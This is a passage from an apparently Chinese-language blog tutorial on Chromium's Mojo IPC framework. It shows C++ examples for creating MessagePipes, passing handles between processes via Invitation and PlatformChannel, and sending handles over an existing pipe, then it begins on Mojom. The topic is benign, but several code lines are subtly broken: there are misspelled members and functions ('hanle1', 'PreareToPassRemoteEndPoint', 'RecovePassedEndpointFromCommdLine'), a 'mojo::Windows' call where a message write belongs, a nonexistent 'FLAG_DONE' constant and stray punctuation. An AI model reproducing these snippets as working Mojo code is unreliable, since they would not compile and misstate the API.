class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他关于DataPipe和SharedBuffer的使用方法都类似。由于实际项目很少直接使用C API，所以使用方法在这里省略。</p><h3 id="Mojo-C-API"><a href="#Mojo-C-API" class="headerlink" title="Mojo C++ API"></a>Mojo C++ API</h3><h4 id="单进程"><a href="#单进程" class="headerlink" title="单进程"></a>单进程</h4><p>以下是在单进程中使用MessagePipe的方法，其中最重要的是要注意<code>mojo::MessagePipe pipe;</code>这一行(内部调用Moojo的C API<code>MojoCreateMessagePipe</code>),它创建了一个<strong>MessagePipe</strong>, 本质上只是创建了一对随机数，对应pipe中的两个属性<code>handle0</code>和<code>handle1</code>，这两个功能上没有任何区别，向其中的一个handle写的数据可以从另外一个handle中读取出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/cpp/system/buffer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/cpp/system/data_pipe.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/cpp/system/message_pipe.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/cpp/system/simple_watcher.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/cpp/system/wait.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用C++接口创建一条MessagePipe</span></span><br><span class="line"></span><br><span class="line">mojo::MessagePipe pipe;</span><br><span class="line"><span class="comment">//使用C++接口发送一条消息</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> kMessage[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    result = mojo::<span class="built_in">WriteMessageRaw</span>(pipe.handle0.<span class="built_in">get</span>(), kMessage, <span class="built_in">sizeof</span>(kMessage), <span class="literal">nullptr</span>, <span class="number">0</span>, MOJO_WRITE_MESSAGE_FLAG_NONE);</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(result, MOJO_RESULT_OK);</span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;send: &quot;</span> &lt;&lt;kMessage;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用C++接口接收一条消息</span></span><br><span class="line">&#123;</span><br><span class="line">    std::vector&lt;<span class="type">uint8_t</span>&gt; data;</span><br><span class="line">    result = mojo::<span class="built_in">ReadMessageRaw</span>(pipe.hanle1.<span class="built_in">get</span>(), &amp;data, <span class="literal">nullptr</span>, MOJO_READ_MESSAGE_FLAG_NONE);</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(result, MOJO_RESULT_OK);</span><br><span class="line">    <span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;receive msg: &quot;</span> &lt;&lt;(<span class="type">char</span>*)&amp;data[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于DataPipe和SharedBuffer的使用这里不再赘述。</p><h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><p>一个**MessagePipe中有一对handle，分别对handle0和handle1，向其中一个handle写的数据可以从另外一个handle中读出来，这是前面已经说过的，如果把其中一个handle发送到另外一个进程，这一对handle之间依然可以相互收发数据。Mojo提供了多种方法来发送handle到其他的进程，最简单的则是使用<a href="https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/cpp/system/invitation.h">Invitation</a></p><p>要在多个进程之间使用MOJO，必须先通过Invitation将这些进程“连接”起来，这需要一个进程发送Invitation，另外一个进程接收Invitation，发送Invitation的方法如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一条系统级的IPC通信通道</span></span><br><span class="line"><span class="comment">//在Linux上是domain socket， Windows上是named pipe，Macos是Mach port，该通道用于支持跨进程的消息通信</span></span><br><span class="line"></span><br><span class="line">mojo::PlatformChannel channel;</span><br><span class="line"><span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;local: &quot;</span></span><br><span class="line">          &lt;&lt; channel.<span class="built_in">local_endpoint</span>().<span class="built_in">platform_handle</span>().<span class="built_in">GetFD</span>().<span class="built_in">get</span>()</span><br><span class="line">          &lt;&lt; <span class="string">&quot;remote: &quot;</span></span><br><span class="line">          &lt;&lt; channel.<span class="built_in">remote_endpoint</span>().<span class="built_in">platform_handle</span>().<span class="built_in">GetFD</span>().<span class="built_in">get</span>():</span><br><span class="line"></span><br><span class="line">mojo::OutgoingInvitation invitation;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建1个Message Pipe用来和其他进程通信</span></span><br><span class="line"><span class="comment">// 这里的pipe就相当于单进程中的pipe.handle0</span></span><br><span class="line"><span class="comment">// handle1会被存储在invitation中，随后杯发送出去</span></span><br><span class="line"><span class="comment">//可以多次调用，以使Attach多个MessagePipe带Invitation中</span></span><br><span class="line"></span><br><span class="line">mojo::ScopedMessagePipeHandle pipe = invitation.<span class="built_in">AttachMessagePipe</span>(<span class="string">&quot;my raw pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;pipe: &quot;</span> &lt;&lt; pipe-&gt;<span class="built_in">value</span>();</span><br><span class="line"></span><br><span class="line">base::LaunchOptions options;</span><br><span class="line"><span class="function">base::CommandLine <span class="title">command_line</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    base::CommandLine::ForCurrentProcess()-&gt;GetProgram())</span></span>;</span><br><span class="line"><span class="comment">// 将PlatformChannel中的RemoteEndpoint的fd作为参数传递给子进程</span></span><br><span class="line"><span class="comment">// 在posix中，fd会被复制到新的随机的fd，fd号改变</span></span><br><span class="line"><span class="comment">// 在windows中，fd被复制后会直接进行传递，fd号不变</span></span><br><span class="line"></span><br><span class="line">channel.<span class="built_in">PreareToPassRemoteEndPoint</span>(&amp;options, &amp;command_line);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动新进程</span></span><br><span class="line">base::Process child_process = base::<span class="built_in">LaunchProcess</span>(command_line, options);</span><br><span class="line">channel.<span class="built_in">RemoteProcessLaunchAttempted</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送Invitation</span></span><br><span class="line">mojo::OutgoingInvitation::<span class="built_in">Send</span>(</span><br><span class="line">    std::<span class="built_in">move</span>(invitation), child_process.<span class="built_in">Handle</span>(),</span><br><span class="line">    channel.<span class="built_in">TakeLocalEndpoint</span>(),</span><br><span class="line">    base::<span class="built_in">BindRepeating</span>(</span><br><span class="line">        [](<span class="type">const</span> std::string&amp; error) &#123;<span class="built_in">LOG</span>(ERROR) &lt;&lt; error; &#125;));</span><br></pre></td></tr></table></figure><p>在新进程接收Invitation的方法如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mojo::IncomingInvitation invitation = mojo::IncomingInvitation::<span class="built_in">Accept</span>(</span><br><span class="line">    mojo::PlatformChannel::<span class="built_in">RecovePassedEndpointFromCommdLine</span>(</span><br><span class="line">        *base::CommandLine::<span class="built_in">ForCurrentProcess</span>()));</span><br><span class="line"><span class="comment">//取出Invitation中的pipe</span></span><br><span class="line">mojo::ScopedMessagePipeHandle pipe = </span><br><span class="line">    invitation.<span class="built_in">ExtractMessagePipe</span>(<span class="string">&quot;my raw pipe&quot;</span>);</span><br><span class="line"><span class="built_in">LOG</span>(INFO) &lt;&lt; <span class="string">&quot;pipe: &quot;</span> &lt;&lt; pipe-&gt;<span class="built_in">value</span>();           </span><br></pre></td></tr></table></figure><p>这样就实现了将piep中的一个handle发送到其他进程了，这两个进程可以开始使用pipe进行收发数据了。<br>以上只是将<strong>handle</strong>从一个进程发送到另一个进程的一种方法，这种方法一般用在新进程创建的时候，如果两个进程已经通过<strong>Invitation</strong>连接起来了，那么可以通过已经建立起来的<strong>MessagePipe</strong>来发送新的<strong>MessagePipe</strong>的<strong>handle</strong>到接收进程，发送端的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> std::string <span class="title">kMessage</span><span class="params">(<span class="string">&quot;MessagePipe\0&quot;</span>, <span class="number">12</span>)</span></span>;</span><br><span class="line">mojo::ScopedMessagePipeHandle client;</span><br><span class="line">mojo::ScopedMessagePipeHandle server;</span><br><span class="line"><span class="comment">//创建一个新的MessagePipe（的一堆handle）</span></span><br><span class="line"><span class="comment">//也可以使用mojo::MessagePipe来创建，这两者是一样的</span></span><br><span class="line">result = mojo::<span class="built_in">CreateMessagePipe</span>(<span class="literal">nullptr</span>, &amp;client, &amp;server);</span><br><span class="line"><span class="built_in">DCHECK_EQ</span>(result, MOJO_RESULT_OK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用已经连接起来的pipe将&#x27;client&#x27;发送到对方</span></span><br><span class="line">result = mojo::<span class="built_in">Windows</span>(pipe.<span class="built_in">get</span>(), kMessage.<span class="built_in">c_str</span>(),</span><br><span class="line">                        kMessage.<span class="built_in">length</span>(), &amp;client-&gt;<span class="built_in">value</span>(), <span class="number">1</span>,</span><br><span class="line">                        MOJO_WRITE_MESSAGE_FLAG_DONE);</span><br><span class="line"><span class="built_in">DCHECK_EQ</span>(result, MOJO_RESULT_OK);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;接收端代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; data;</span><br><span class="line"><span class="comment">//用来存储数据的handle</span></span><br><span class="line">std::vector&lt;mojo::ScopedHandle&gt; handles;</span><br><span class="line">result = mojo::<span class="built_in">ReadMessageRaw</span>(pipe.<span class="built_in">get</span>(), &amp;data, &amp;handles, MOJO_READ_MESSAGE_FLAG_NONE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将接收到的handle转换为MessagePipeHandle</span></span><br><span class="line"><span class="comment">//后续就可以使用这个handle和对端通信了</span></span><br><span class="line"></span><br><span class="line">mojo::ScopedMessagePipeHandle client = </span><br><span class="line">            mojo::ScopedMessagePipeHandle::<span class="built_in">From</span>(std::<span class="built_in">move</span>(handles[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure><h3 id="Mojo-C-Bindings-API"><a href="#Mojo-C-Bindings-API" class="headerlink" title="Mojo C++ Bindings API"></a>Mojo C++ Bindings API</h3><p>Bindings API是使用mojo的重点，在项目中会大量使用</p><h3 id="Mojom"><a href="#Mojom" class="headerlink" title="Mojom"></a>Mojom</h3><p>Mojo在Binding层引入了<a href="https://chromium.googlesource.com/chromium/src/+/master/mojo/public/tools/bindings/README.md">Mojom</a>这种IDL语言，用它来定义接口。接口定义文件的后缀一般为<code>.mojo,</code>，一个简单的接口定义如下</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Mojo&quot;&gt;&lt;a href=&quot;#Mojo&quot; class=&quot;headerlink&quot; title=&quot;Mojo&quot;&gt;&lt;/a&gt;Mojo&lt;/h1&gt;&lt;p&gt;Mojo是一个跨平台的IPC框架，诞生于chromium，用来实现chromium进程内或进程间通信。目前也被用于Chromeos。&lt;/p&gt;</summary>
    
    
    
    <category term="chrome" scheme="http://example.com/categories/chrome/"/>
    
    
    <category term="chrome" scheme="http://example.com/tags/chrome/"/>
    
    <category term="mojo" scheme="http://example.com/tags/mojo/"/>
    
  </entry>
  
</feed>
